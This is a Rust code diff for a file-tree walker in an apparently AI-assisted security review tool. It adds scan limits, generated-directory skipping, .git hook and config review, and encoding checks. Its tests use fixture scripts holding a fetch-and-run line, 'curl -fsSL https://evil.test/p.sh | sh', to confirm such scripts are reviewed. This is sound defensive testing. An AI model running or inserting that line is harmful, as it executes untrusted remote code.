@@ -7,6 +7,7 @@
 //! re-resolving a path an attacker could change. Every opened file gets the
 //! same device/inode check.
 
+use std::collections::HashMap;
 use std::ffi::OsString;
 use std::fs::{self, File, Metadata, OpenOptions};
 use std::io::{self, Read};
@@ -14,16 +15,44 @@ use std::os::fd::AsRawFd;
 use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
 use std::path::{Path, PathBuf};
 
+use crate::content::{self, Content, Format, Prefix};
 use crate::error::Error;
 use crate::report::Gap;
 use crate::sha256::{Digest, Sha256};
 
 pub const MAX_TEXT_FILE_SIZE: u64 = 2 * 1024 * 1024;
 pub const MAX_HASHED_FILE_SIZE: u64 = 512 * 1024 * 1024;
-const BINARY_PROBE_SIZE: usize = 8192;
 
-/// Directories skipped unless the scan is thorough. `.git` is always skipped.
-const IGNORED_DIRS: &[&str] = &["target", "node_modules", ".venv", "vendor", "dist", "build"];
+/// Whole-tree limits: past any of them the walk stops with a gap, so a tree
+/// built to exhaust memory or time (thousands of hardlinks to one large
+/// file, huge sparse files) fails closed quickly.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct Limits {
+    pub files: usize,
+    pub text_bytes: u64,
+    pub hashed_bytes: u64,
+}
+
+impl Limits {
+    pub const DEFAULT: Self = Self {
+        files: 200_000,
+        text_bytes: 256 * 1024 * 1024,
+        hashed_bytes: 4 * 1024 * 1024 * 1024,
+    };
+}
+
+/// Top-level directories a tool generates, skipped unless the scan is
+/// thorough, and only when they carry the tool's marker file. The marker is
+/// easy to fake, so a skip is always reported and a review with one is at
+/// best WARNED. `vendor`, `dist` and `build` are shipped code and reviewed.
+const GENERATED_DIRS: &[(&str, &[&str])] = &[
+    ("target", &["CACHEDIR.TAG"]),
+    (
+        "node_modules",
+        &[".package-lock.json", ".modules.yaml", ".yarn-state.yml"],
+    ),
+    (".venv", &["pyvenv.cfg"]),
+];
 
 /// `O_NONBLOCK` in the Linux generic ABI (`x86_64`, `aarch64`, `arm`, `riscv64`). A path
 /// swapped for a FIFO between `lstat` and `open` then fails the identity check
@@ -36,6 +65,7 @@ pub struct ScanConfig {
     pub include_ignored_dirs: bool,
     /// Top-level directory names left out of both the review and the snapshot.
     pub excluded_top_level: Vec<String>,
+    pub limits: Limits,
 }
 
 impl ScanConfig {
@@ -44,24 +74,49 @@ impl ScanConfig {
             root: root.into(),
             include_ignored_dirs: false,
             excluded_top_level: Vec::new(),
+            limits: Limits::DEFAULT,
         }
     }
 
+    /// Names left out of the walk. `.git` is walked separately (see
+    /// `Walker::git_directory`).
     fn skips(&self, name: &str, top_level: bool) -> bool {
         name == ".git"
-            || (!self.include_ignored_dirs && IGNORED_DIRS.contains(&name))
             || (top_level
-                && self
-                    .excluded_top_level
-                    .iter()
-                    .any(|excluded| excluded == name))
+                && (self.is_generated(name)
+                    || self
+                        .excluded_top_level
+                        .iter()
+                        .any(|excluded| excluded == name)))
     }
+
+    /// A top-level generated directory this scan skips.
+    fn is_generated(&self, name: &str) -> bool {
+        !self.include_ignored_dirs
+            && GENERATED_DIRS.iter().any(|(generated, markers)| {
+                *generated == name
+                    && markers.iter().any(|marker| {
+                        fs::symlink_metadata(self.root.join(name).join(marker))
+                            .is_ok_and(|metadata| metadata.is_file())
+                    })
+            })
+    }
+}
+
+/// A generated directory the walk skipped, with how many entries it held
+/// (counted without reading them, up to the file limit).
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct SkippedDir {
+    pub path: String,
+    pub files: usize,
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub enum FileKind {
-    /// UTF-8 text within the review size limit.
+    /// Text within the review size limit (see `FileHash::lossy`).
     Text,
+    /// A script, build or config file holding binary data: a gap.
+    Undecodable,
     /// Hashed but not reviewed.
     Binary,
     /// Text too large to review; makes the scan incomplete.
@@ -78,22 +133,34 @@ pub struct FileHash {
     pub path: String,
     pub sha256: Digest,
     pub kind: FileKind,
+    /// The format of a hash-only file.
+    pub format: Option<Format>,
+    /// Text decoded with replacement characters.
+    pub lossy: bool,
+    /// Size in bytes.
+    pub bytes: u64,
 }
 
 /// The files of a tree, sorted by path.
 #[derive(Clone, Debug, Default, PartialEq, Eq)]
 pub struct Snapshot {
     files: Vec<FileHash>,
+    skipped: Vec<SkippedDir>,
 }
 
 impl Snapshot {
-    fn from_files(mut files: Vec<FileHash>) -> Self {
+    fn from_files(mut files: Vec<FileHash>, skipped: Vec<SkippedDir>) -> Self {
         files.sort_by(|left, right| left.path.cmp(&right.path));
-        Self { files }
+        Self { files, skipped }
     }
 
     pub fn files(&self) -> &[FileHash] {
         &self.files
+    }
+
+    /// Generated directories left out of the review.
+    pub fn skipped(&self) -> &[SkippedDir] {
+        &self.skipped
     }
 
     pub fn count(&self, kind: FileKind) -> usize {
@@ -111,9 +178,14 @@ impl Snapshot {
             hasher.update(&[match file.kind {
                 FileKind::Text => 1,
                 FileKind::Symlink => 2,
-                FileKind::Binary | FileKind::OversizedText => 0,
+                FileKind::Binary | FileKind::OversizedText | FileKind::Undecodable => 0,
             }]);
             hasher.update(b"\n");
+        }
+        for skipped in &self.skipped {
+            hasher.update(b"skipped\0");
+            hasher.update(skipped.path.as_bytes());
+            hasher.update(format!("\0{}\n", skipped.files).as_bytes());
         }
         hasher.finalize()
     }
@@ -123,6 +195,8 @@ impl Snapshot {
 pub struct TextFile<'a> {
     pub rel: &'a str,
     pub text: &'a str,
+    /// Decoded with replacement characters from a legacy encoding.
+    pub lossy: bool,
 }
 
 /// Walks the tree, calling `on_text` for each reviewable text file. Returns
@@ -133,6 +207,11 @@ pub fn walk(config: &ScanConfig, on_text: &mut dyn FnMut(TextFile<'_>)) -> (Snap
         on_text,
         files: Vec::new(),
         gaps: Vec::new(),
+        text_bytes: 0,
+        hashed_bytes: 0,
+        stopped: false,
+        links: HashMap::new(),
+        skipped: Vec::new(),
     };
 
     let root = &config.root;
@@ -146,7 +225,10 @@ pub fn walk(config: &ScanConfig, on_text: &mut dyn FnMut(TextFile<'_>)) -> (Snap
     };
     walker.entry(root, root, rel);
 
-    (Snapshot::from_files(walker.files), walker.gaps)
+    (
+        Snapshot::from_files(walker.files, walker.skipped),
+        walker.gaps,
+    )
 }
 
 /// Re-walks the tree and requires it to match `expected` exactly.
@@ -170,6 +252,13 @@ struct Walker<'a> {
     on_text: &'a mut dyn FnMut(TextFile<'_>),
     files: Vec<FileHash>,
     gaps: Vec<Gap>,
+    text_bytes: u64,
+    hashed_bytes: u64,
+    /// A limit was passed: the walk stops and the review is incomplete.
+    stopped: bool,
+    /// Files with more than one link, by device and inode: read once.
+    links: HashMap<(u64, u64), (Digest, Contents)>,
+    skipped: Vec<SkippedDir>,
 }
 
 impl Walker<'_> {
@@ -183,6 +272,12 @@ impl Walker<'_> {
     /// Visits one entry. `access` is the path used to reach it (under a
     /// verified directory handle); `logical` is the path shown to the user.
     fn entry(&mut self, access: &Path, logical: &Path, rel: String) {
+        if self.stopped {
+            return;
+        }
+        if self.files.len() >= self.config.limits.files {
+            return self.stop();
+        }
         let metadata = match fs::symlink_metadata(access) {
             Ok(metadata) => metadata,
             Err(error) => return self.io_gap(logical, error),
@@ -227,6 +322,9 @@ impl Walker<'_> {
                     path: rel,
                     sha256: hasher.finalize(),
                     kind: FileKind::Symlink,
+                    format: None,
+                    lossy: false,
+                    bytes: 0,
                 });
             }
             Some(_) | None => self.gaps.push(Gap::Symlink(logical.display().to_string())),
@@ -305,16 +403,101 @@ impl Walker<'_> {
                     .push(Gap::NonUtf8Name(child_logical.display().to_string()));
                 continue;
             };
-            if self.config.skips(name_text, rel.is_empty()) {
-                continue;
-            }
-
             let child_rel = if rel.is_empty() {
                 name_text.to_string()
             } else {
                 format!("{rel}/{name_text}")
             };
+            if name_text == ".git" {
+                self.git_directory(&handle.join(&name), &child_logical, &child_rel);
+                continue;
+            }
+            if rel.is_empty() && self.config.is_generated(name_text) {
+                let files = count_entries(&handle.join(&name), self.config.limits.files);
+                self.skipped.push(SkippedDir {
+                    path: child_rel,
+                    files,
+                });
+                continue;
+            }
+            if self.config.skips(name_text, rel.is_empty()) {
+                continue;
+            }
             self.entry(&handle.join(&name), &child_logical, child_rel);
+        }
+    }
+
+    /// A `.git` directory: its `config` (checked for keys that run commands,
+    /// never sent to the AI) and its hooks other than git's `.sample` files
+    /// are reviewed, and a submodule's git directory the same way. The
+    /// objects and index are not read. A `.git` file (a worktree or
+    /// submodule pointer) is left out.
+    fn git_directory(&mut self, access: &Path, logical: &Path, rel: &str) {
+        let Ok(metadata) = fs::symlink_metadata(access) else {
+            return;
+        };
+        if !metadata.is_dir() {
+            return;
+        }
+        let directory = match open_verified(access, &metadata) {
+            Ok(directory) => directory,
+            Err(error) => return self.io_gap(logical, error),
+        };
+        let handle = fd_path(&directory);
+        if fs::symlink_metadata(handle.join("config")).is_ok() {
+            self.entry(
+                &handle.join("config"),
+                &logical.join("config"),
+                format!("{rel}/config"),
+            );
+        }
+        for (name, hooks) in [("hooks", true), ("modules", false)] {
+            let Ok(metadata) = fs::symlink_metadata(handle.join(name)) else {
+                continue;
+            };
+            if !metadata.is_dir() {
+                continue;
+            }
+            let child = match open_verified(&handle.join(name), &metadata) {
+                Ok(child) => child,
+                Err(error) => {
+                    self.io_gap(&logical.join(name), error);
+                    continue;
+                }
+            };
+            let child_handle = fd_path(&child);
+            let mut names: Vec<String> = match fs::read_dir(&child_handle) {
+                Ok(listing) => listing
+                    .filter_map(Result::ok)
+                    .filter_map(|entry| entry.file_name().into_string().ok())
+                    .collect(),
+                Err(error) => {
+                    self.io_gap(&logical.join(name), error);
+                    continue;
+                }
+            };
+            names.sort();
+            for entry in names {
+                let entry_rel = format!("{rel}/{name}/{entry}");
+                let entry_logical = logical.join(name).join(&entry);
+                if hooks {
+                    if !entry.ends_with(".sample") {
+                        self.entry(&child_handle.join(&entry), &entry_logical, entry_rel);
+                    }
+                } else {
+                    self.git_directory(&child_handle.join(&entry), &entry_logical, &entry_rel);
+                }
+            }
+        }
+    }
+
+    fn stop(&mut self) {
+        if !self.stopped {
+            self.stopped = true;
+            self.gaps.push(Gap::TreeTooLarge {
+                files: self.files.len(),
+                bytes: self.hashed_bytes,
+            });
         }
     }
 
@@ -324,28 +507,82 @@ impl Walker<'_> {
                 .push(Gap::HashLimit(logical.display().to_string()));
             return;
         }
+        // Counted before reading, so a huge sparse file is refused unread.
+        self.hashed_bytes += metadata.len();
+        if self.hashed_bytes > self.config.limits.hashed_bytes {
+            return self.stop();
+        }
 
-        let (sha256, contents) = match read_classified(&mut file) {
-            Ok(result) => result,
-            Err(error) => return self.io_gap(logical, error),
+        let executable = metadata.mode() & 0o111 != 0;
+        let key = (metadata.dev(), metadata.ino());
+        let cached = (metadata.nlink() > 1)
+            .then(|| self.links.get(&key).cloned())
+            .flatten();
+        let (sha256, contents) = match cached {
+            Some(result) => result,
+            None => match read_classified(&mut file, &rel, executable) {
+                Ok(result) => {
+                    if metadata.nlink() > 1 {
+                        self.links.insert(key, result.clone());
+                    }
+                    result
+                }
+                Err(error) => return self.io_gap(logical, error),
+            },
         };
-        let kind = match &contents {
-            Contents::Text(text) => {
-                (self.on_text)(TextFile { rel: &rel, text });
-                FileKind::Text
+        let (kind, format, lossy) = match &contents {
+            Contents::Text(text, lossy) => {
+                self.text_bytes += text.len() as u64;
+                if self.text_bytes > self.config.limits.text_bytes {
+                    return self.stop();
+                }
+                (self.on_text)(TextFile {
+                    rel: &rel,
+                    text,
+                    lossy: *lossy,
+                });
+                (FileKind::Text, None, *lossy)
             }
-            Contents::Binary => FileKind::Binary,
+            Contents::Binary(format) => (FileKind::Binary, Some(*format), false),
             Contents::OversizedText => {
                 self.gaps.push(Gap::OversizedText(rel.clone()));
-                FileKind::OversizedText
+                (FileKind::OversizedText, None, false)
+            }
+            Contents::Undecodable => {
+                self.gaps.push(Gap::Undecodable(rel.clone()));
+                (FileKind::Undecodable, None, false)
             }
         };
         self.files.push(FileHash {
             path: rel,
             sha256,
             kind,
+            format,
+            lossy,
+            bytes: metadata.len(),
         });
     }
+}
+
+/// Entries under `path`, not following links, counted up to `limit`.
+fn count_entries(path: &Path, limit: usize) -> usize {
+    let mut count = 0;
+    let mut pending = vec![path.to_path_buf()];
+    while let Some(directory) = pending.pop() {
+        let Ok(listing) = fs::read_dir(&directory) else {
+            continue;
+        };
+        for entry in listing.filter_map(Result::ok) {
+            count += 1;
+            if count >= limit {
+                return count;
+            }
+            if entry.file_type().is_ok_and(|kind| kind.is_dir()) {
+                pending.push(entry.path());
+            }
+        }
+    }
+    count
 }
 
 fn fd_path(file: &File) -> PathBuf {
@@ -365,15 +602,19 @@ fn open_verified(access: &Path, expected: &Metadata) -> io::Result<File> {
     Ok(file)
 }
 
+#[derive(Clone)]
 enum Contents {
-    Text(String),
-    Binary,
+    /// Text to review; `true` when decoded with replacement characters.
+    Text(String, bool),
+    Binary(Format),
     OversizedText,
+    Undecodable,
 }
 
-/// Hashes the whole file and keeps its text when it is small enough to
-/// review. Larger files are classified from their first bytes and streamed.
-fn read_classified(file: &mut File) -> io::Result<(Digest, Contents)> {
+/// Hashes the whole file and classifies it (see `content::classify`),
+/// keeping its text when it is small enough to review. Larger files are
+/// classified from their first bytes and streamed.
+fn read_classified(file: &mut File, rel: &str, executable: bool) -> io::Result<(Digest, Contents)> {
     let mut hasher = Sha256::new();
     let mut head = Vec::new();
     file.by_ref()
@@ -383,17 +624,19 @@ fn read_classified(file: &mut File) -> io::Result<(Digest, Contents)> {
 
     if head.len() as u64 <= MAX_TEXT_FILE_SIZE {
         let digest = hasher.finalize();
-        let contents = match String::from_utf8(head) {
-            Ok(text) if !text.contains('\0') => Contents::Text(text),
-            Ok(_) | Err(_) => Contents::Binary,
+        let contents = match content::classify(rel, executable, false, &head) {
+            Content::Text(text) => Contents::Text(text, false),
+            Content::Lossy { text, .. } => Contents::Text(text, true),
+            Content::Binary(format) => Contents::Binary(format),
+            Content::Undecodable => Contents::Undecodable,
         };
         return Ok((digest, contents));
     }
 
-    let contents = if looks_binary(&head[..BINARY_PROBE_SIZE]) {
-        Contents::Binary
-    } else {
-        Contents::OversizedText
+    let contents = match content::classify_prefix(rel, executable, &head) {
+        Prefix::Text => Contents::OversizedText,
+        Prefix::Binary(format) => Contents::Binary(format),
+        Prefix::Undecodable => Contents::Undecodable,
     };
 
     let mut total = head.len() as u64;
@@ -410,15 +653,6 @@ fn read_classified(file: &mut File) -> io::Result<(Digest, Contents)> {
         hasher.update(&buffer[..count]);
     }
     Ok((hasher.finalize(), contents))
-}
-
-/// NUL bytes or invalid UTF-8 in a prefix. A multi-byte character cut off at
-/// the end of the prefix does not count.
-fn looks_binary(prefix: &[u8]) -> bool {
-    prefix.contains(&0)
-        || std::str::from_utf8(prefix)
-            .err()
-            .is_some_and(|error| error.error_len().is_some())
 }
 
 #[cfg(test)]
@@ -456,18 +690,87 @@ mod tests {
     }
 
     #[test]
-    fn skips_git_and_generated_directories_unless_thorough() {
+    fn shipped_directories_are_reviewed_and_marked_generated_ones_skipped() {
         let dir = TempDir::new("ignored");
-        fs::create_dir_all(dir.path().join(".git")).unwrap();
-        fs::create_dir_all(dir.path().join("vendor/theme")).unwrap();
-        fs::write(dir.path().join(".git/config"), "x\n").unwrap();
-        fs::write(dir.path().join("vendor/theme/payload.lua"), "x\n").unwrap();
+        for directory in [
+            "vendor",
+            "dist",
+            "build",
+            "src/node_modules/x",
+            "node_modules/x",
+            "target",
+        ] {
+            fs::create_dir_all(dir.path().join(directory)).unwrap();
+        }
+        fs::write(dir.path().join("vendor/lib.sh"), "x\n").unwrap();
+        fs::write(dir.path().join("dist/app.js"), "x\n").unwrap();
+        fs::write(dir.path().join("build/install.sh"), "x\n").unwrap();
+        fs::write(dir.path().join("src/node_modules/x/i.js"), "x\n").unwrap();
+        fs::write(dir.path().join("node_modules/x/i.js"), "x\n").unwrap();
+        fs::write(dir.path().join("node_modules/.package-lock.json"), "{}\n").unwrap();
+        // No CACHEDIR.TAG: not generated-shaped, so reviewed.
+        fs::write(dir.path().join("target/run.sh"), "x\n").unwrap();
 
         let mut config = ScanConfig::new(dir.path());
-        assert!(walk_texts(&config).0.is_empty());
+        let (texts, snapshot, _) = walk_texts(&config);
+        assert_eq!(
+            texts,
+            [
+                "build/install.sh",
+                "dist/app.js",
+                "src/node_modules/x/i.js",
+                "target/run.sh",
+                "vendor/lib.sh"
+            ]
+        );
+        assert_eq!(
+            snapshot.skipped(),
+            [super::SkippedDir {
+                path: "node_modules".into(),
+                files: 3
+            }]
+        );
+
+        // A new file in a skipped directory changes the snapshot.
+        fs::write(dir.path().join("node_modules/x/j.js"), "x\n").unwrap();
+        assert!(verify_unchanged(&config, &snapshot).is_err());
 
         config.include_ignored_dirs = true;
-        assert_eq!(walk_texts(&config).0, ["vendor/theme/payload.lua"]);
+        assert!(
+            walk_texts(&config)
+                .0
+                .contains(&"node_modules/x/i.js".to_string())
+        );
+    }
+
+    #[test]
+    fn git_config_and_real_hooks_are_reviewed_and_samples_are_not() {
+        let dir = TempDir::new("git-state");
+        fs::create_dir_all(dir.path().join(".git/hooks")).unwrap();
+        fs::create_dir_all(dir.path().join(".git/objects/aa")).unwrap();
+        fs::create_dir_all(dir.path().join(".git/modules/lib/hooks")).unwrap();
+        fs::write(dir.path().join(".git/config"), "[core]\n").unwrap();
+        fs::write(dir.path().join(".git/HEAD"), "ref: x\n").unwrap();
+        fs::write(dir.path().join(".git/objects/aa/b"), "x\n").unwrap();
+        fs::write(dir.path().join(".git/hooks/pre-commit.sample"), "x\n").unwrap();
+        fs::write(dir.path().join(".git/hooks/post-checkout"), "x\n").unwrap();
+        fs::write(dir.path().join(".git/modules/lib/config"), "[core]\n").unwrap();
+        fs::write(dir.path().join(".git/modules/lib/hooks/pre-push"), "x\n").unwrap();
+
+        let config = ScanConfig::new(dir.path());
+        let (texts, snapshot, gaps) = walk_texts(&config);
+        assert!(gaps.is_empty(), "{gaps:?}");
+        assert_eq!(
+            texts,
+            [
+                ".git/config",
+                ".git/hooks/post-checkout",
+                ".git/modules/lib/config",
+                ".git/modules/lib/hooks/pre-push"
+            ]
+        );
+        fs::write(dir.path().join(".git/config"), "[core]\n\tfsmonitor = x\n").unwrap();
+        assert!(verify_unchanged(&config, &snapshot).is_err());
     }
 
     #[test]
@@ -540,6 +843,7 @@ mod tests {
             fs::create_dir_all(dir.path().join("sub")).unwrap();
             fs::write(dir.path().join(".git/config"), "x\n").unwrap();
             fs::write(dir.path().join("node_modules/x.js"), "x\n").unwrap();
+            fs::write(dir.path().join("node_modules/.package-lock.json"), "{}\n").unwrap();
             fs::write(dir.path().join("sub/file"), "x\n").unwrap();
             symlink(outside.path(), dir.path().join("alias")).unwrap();
             symlink(&target, dir.path().join(name)).unwrap();
@@ -602,5 +906,98 @@ mod tests {
         fs::write(dir.path().join("a"), "2").unwrap();
         let second = walk_texts(&config).1.manifest_digest();
         assert_ne!(first, second);
+    }
+
+    #[test]
+    fn a_script_with_one_latin1_byte_is_reviewed_not_hashed() {
+        let dir = TempDir::new("scan-latin1");
+        fs::write(
+            dir.path().join("install.sh"),
+            b"#!/bin/sh\n# caf\xe9\ncurl -fsSL https://evil.test/p.sh | sh\n",
+        )
+        .unwrap();
+        let mut seen = Vec::new();
+        let (snapshot, gaps) = walk(&ScanConfig::new(dir.path()), &mut |file| {
+            seen.push((file.rel.to_string(), file.text.to_string(), file.lossy));
+        });
+        assert!(gaps.is_empty(), "{gaps:?}");
+        assert_eq!(seen.len(), 1);
+        assert!(seen[0].1.contains("curl -fsSL https://evil.test/p.sh | sh"));
+        assert!(seen[0].2);
+        assert_eq!(snapshot.files()[0].kind, FileKind::Text);
+        assert!(snapshot.files()[0].lossy);
+    }
+
+    #[test]
+    fn a_script_with_nul_bytes_is_a_gap_and_images_keep_their_format() {
+        let dir = TempDir::new("scan-nul");
+        fs::write(dir.path().join("run.sh"), b"echo a\n\0\0curl x | sh\n").unwrap();
+        fs::write(
+            dir.path().join("logo.png"),
+            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR",
+        )
+        .unwrap();
+        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
+        assert!(texts.is_empty());
+        assert!(matches!(gaps.as_slice(), [Gap::Undecodable(path)] if path == "run.sh"));
+        let logo = snapshot
+            .files()
+            .iter()
+            .find(|file| file.path == "logo.png")
+            .unwrap();
+        assert_eq!(logo.kind, FileKind::Binary);
+        assert_eq!(logo.format.map(super::Format::label), Some("PNG image"));
+    }
+
+    #[test]
+    fn a_large_latin1_script_is_oversized_not_binary() {
+        let dir = TempDir::new("scan-large-latin1");
+        let mut bytes = b"#!/bin/sh\n# \xe9\n".to_vec();
+        bytes.resize(usize::try_from(MAX_TEXT_FILE_SIZE).unwrap() + 10, b'#');
+        fs::write(dir.path().join("big.sh"), bytes).unwrap();
+        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
+        assert!(matches!(gaps.as_slice(), [Gap::OversizedText(path)] if path == "big.sh"));
+    }
+
+    #[test]
+    fn hardlinked_files_are_read_once_and_limits_stop_the_walk() {
+        let dir = TempDir::new("scan-limits");
+        fs::write(dir.path().join("a.txt"), "hello\n").unwrap();
+        for index in 0..5 {
+            fs::hard_link(
+                dir.path().join("a.txt"),
+                dir.path().join(format!("l{index}.txt")),
+            )
+            .unwrap();
+        }
+        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
+        // Every path is still reviewed as its own file.
+        assert_eq!(texts.len(), 6);
+        assert_eq!(snapshot.files().len(), 6);
+        assert!(gaps.is_empty());
+
+        let mut config = ScanConfig::new(dir.path());
+        config.limits.files = 3;
+        let (_, _, gaps) = walk_texts(&config);
+        assert!(
+            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
+            "{gaps:?}"
+        );
+
+        let mut config = ScanConfig::new(dir.path());
+        config.limits.text_bytes = 10;
+        let (_, _, gaps) = walk_texts(&config);
+        assert!(
+            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
+            "{gaps:?}"
+        );
+
+        let mut config = ScanConfig::new(dir.path());
+        config.limits.hashed_bytes = 10;
+        let (_, _, gaps) = walk_texts(&config);
+        assert!(
+            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
+            "{gaps:?}"
+        );
     }
 }
